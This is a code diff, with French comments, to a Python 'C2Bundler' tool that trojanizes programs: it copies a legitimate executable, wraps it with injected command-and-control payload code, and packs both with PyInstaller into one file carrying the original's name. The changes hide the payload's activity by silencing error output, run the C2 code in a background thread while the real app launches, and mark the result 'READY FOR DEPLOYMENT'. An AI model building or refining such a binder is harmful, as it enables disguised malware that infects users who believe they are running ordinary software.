@@ -11,10 +11,9 @@ import os
 import sys
 import subprocess
 import tempfile
-import json
-import base64
+import shutil
 from pathlib import Path
-from typing import Optional, Dict, Any
+from typing import Optional
 
 
 class C2Bundler:
@@ -23,6 +22,10 @@ class C2Bundler:
     def __init__(self):
         self.dist_dir = Path.cwd() / "dist"
         self.dist_dir.mkdir(exist_ok=True)
+        self.spec_dir = self.dist_dir / "specs"
+        self.spec_dir.mkdir(exist_ok=True)
+        self.build_dir = self.dist_dir / "build"
+        self.build_dir.mkdir(exist_ok=True)
         self.resources_dir = self.dist_dir / "resources"
         self.resources_dir.mkdir(exist_ok=True)
 
@@ -58,21 +61,24 @@ class C2Bundler:
         print(f"[*] Target platform: {platform}")
 
         output_name = "c2_payload"
+        self._cleanup_previous_bundle(output_name)
+
         cmd = [
             "pyinstaller",
             "--onefile",
+            "-y",
             "--distpath",
             str(self.dist_dir),
             "--specpath",
-            str(self.dist_dir / "specs"),
+            str(self.spec_dir),
             "--workpath",
-            str(self.dist_dir / "build"),
+            str(self.build_dir),
             "--name",
             output_name,
         ]
 
         # Platform-specific options
-        if platform == "windows":
+        if platform == "windows" and sys.platform.startswith("win"):
             cmd.extend(["--windowed"])
 
         # Add resources folder if patch mode
@@ -98,7 +104,15 @@ class C2Bundler:
 
             if result.returncode != 0:
                 print(f"[!] PyInstaller failed with return code {result.returncode}")
+                # Ne pas supprimer le temp file en cas d'erreur pour debug
                 return False
+
+            # Supprimer seulement si succès
+            try:
+                os.unlink(temp_file)
+                print(f"[*] Cleaned up temp file: {temp_file}")
+            except:
+                pass
 
             return True
 
@@ -111,12 +125,6 @@ class C2Bundler:
 
             print(traceback.format_exc())
             return False
-        finally:
-            # Cleanup temp file
-            try:
-                os.unlink(temp_file)
-            except:
-                pass
 
     def verify_executable(self, platform: str = "windows") -> bool:
         """Vérifie que l'executable a été créé correctement"""
@@ -170,10 +178,12 @@ class C2Bundler:
                 print(f"[!] Target file not found: {target_file}")
                 return False
 
+            # Réinitialiser les ressources pour éviter les collisions
+            self._reset_resources_dir()
+
             # Copier le fichier original dans resources
             original_file = self.resources_dir / target_path.name
             print(f"[*] Copying original file to: {original_file}")
-            import shutil
 
             shutil.copy2(target_file, original_file)
             print(
@@ -206,15 +216,25 @@ class C2Bundler:
             if platform == "windows":
                 source = self.dist_dir / f"{output_name}.exe"
                 if not source.exists():
+                    print(f"[*] No .exe found, checking macOS binary...")
                     source = self.dist_dir / output_name
                 dest = self.dist_dir / target_path.name
             else:
                 source = self.dist_dir / output_name
                 dest = self.dist_dir / target_path.stem
 
+            print(f"[*] Looking for output: {source}")
+            print(f"[*] Dist dir contents: {list(self.dist_dir.iterdir())}")
+
             if source.exists():
+                print(f"[+] Found bundled executable: {source}")
                 if dest.exists():
-                    dest.unlink()
+                    print(f"[*] Removing existing destination: {dest}")
+                    if dest.is_dir():
+                        shutil.rmtree(dest)
+                    else:
+                        dest.unlink()
+                print(f"[*] Renaming {source.name} -> {dest.name}")
                 source.rename(dest)
                 size_mb = dest.stat().st_size / 1024 / 1024
                 print(f"[+] Patched executable: {dest}")
@@ -223,7 +243,8 @@ class C2Bundler:
                 print(f"[+] Status: ✅ READY FOR DEPLOYMENT")
                 return True
             else:
-                print(f"[!] Executable not found")
+                print(f"[!] Executable not found at: {source}")
+                print(f"[!] Expected file does not exist")
                 return False
 
         except Exception as e:
@@ -233,16 +254,51 @@ class C2Bundler:
             print(traceback.format_exc())
             return False
 
+    def _cleanup_previous_bundle(self, output_name: str) -> None:
+        """Remove previous bundle artifacts so PyInstaller can overwrite."""
+        targets = [
+            self.dist_dir / output_name,
+            self.dist_dir / f"{output_name}.exe",
+            self.dist_dir / f"{output_name}.app",
+        ]
+
+        for target in targets:
+            if target.exists():
+                try:
+                    if target.is_dir():
+                        shutil.rmtree(target)
+                    else:
+                        target.unlink()
+                except Exception as exc:
+                    print(f"[!] Warning: failed to remove {target}: {exc}")
+
+    def _reset_resources_dir(self) -> None:
+        """Ensure resources directory is clean before copying files."""
+        if self.resources_dir.exists():
+            for item in self.resources_dir.iterdir():
+                try:
+                    if item.is_dir():
+                        shutil.rmtree(item)
+                    else:
+                        item.unlink()
+                except Exception as exc:
+                    print(f"[!] Warning: failed to remove resource {item}: {exc}")
+        else:
+            self.resources_dir.mkdir(parents=True, exist_ok=True)
+
     def _create_wrapper_code(
         self, original_filename: str, payload_code: str, platform: str
     ) -> str:
         """Crée le code wrapper qui lance l'original + C2"""
 
-        # Extraire juste le code C2 (sans les imports dupliqués)
-        # Le payload_code contient déjà tout le code nécessaire
+        # Important: Indenter le payload_code correctement pour qu'il soit dans run_c2_payload
+        # On ajoute 8 espaces (2 niveaux d'indentation) à chaque ligne du payload
+        indented_payload = "\n".join(
+            "        " + line if line.strip() else line
+            for line in payload_code.strip().split("\n")
+        )
 
-        wrapper = f'''
-import os
+        wrapper = f'''import os
 import sys
 import subprocess
 import threading
@@ -261,25 +317,19 @@ def run_original_app():
     """Lance l'application originale"""
     try:
         if original_app.exists():
-            print(f"[*] Launching original app: {{original_app}}")
             subprocess.Popen([str(original_app)], shell=False)
-        else:
-            print(f"[!] Original app not found: {{original_app}}")
     except Exception as e:
-        print(f"[!] Error launching original: {{e}}")
+        pass
 
 def run_c2_payload():
     """Lance le payload C2 en arrière-plan"""
     try:
-        # Attendre un peu que l'app originale démarre
         import time
         time.sleep(2)
-        
-        # Code C2 injecté ci-dessous
-        {payload_code}
-        
+        # Code C2 ci-dessous
+{indented_payload}
     except Exception as e:
-        print(f"[!] C2 Error: {{e}}")
+        pass
 
 if __name__ == "__main__":
     # Lancer l'app originale dans un thread
